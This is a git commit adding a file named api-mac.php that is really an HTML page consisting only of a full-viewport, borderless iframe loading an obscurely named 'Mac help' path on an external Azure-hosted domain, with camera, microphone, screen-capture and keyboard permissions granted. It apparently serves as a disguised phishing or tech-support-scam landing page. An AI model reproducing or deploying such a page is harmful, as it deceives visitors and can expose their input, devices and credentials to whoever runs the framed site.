3022c00cfebb1ac8c068223c2c97d2a5d00acce9
umutbulut091-cell <umutbulut091@gmail.com>
2026-07-01 19:54:35 +0530

    Add files via upload

---
+++ api-mac.php
@@ -0,0 +1,13 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title></title>
+</head>
+<body>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
+  <iframe src="https://knowledgeorbit-d3ggcvf5c0h3a7g6.z03.azurefd.net/Ma0cHelpMark0er007/index.html?ph0nq=null" style="visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" allowfullscreen 
+  webkitallowfullscreen 
+  mozallowfullscreen 
+  allow="fullscreen *; pointer-lock *; keyboard-map *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *; screen-wake-lock *"></iframe>
+</body>
+</html>
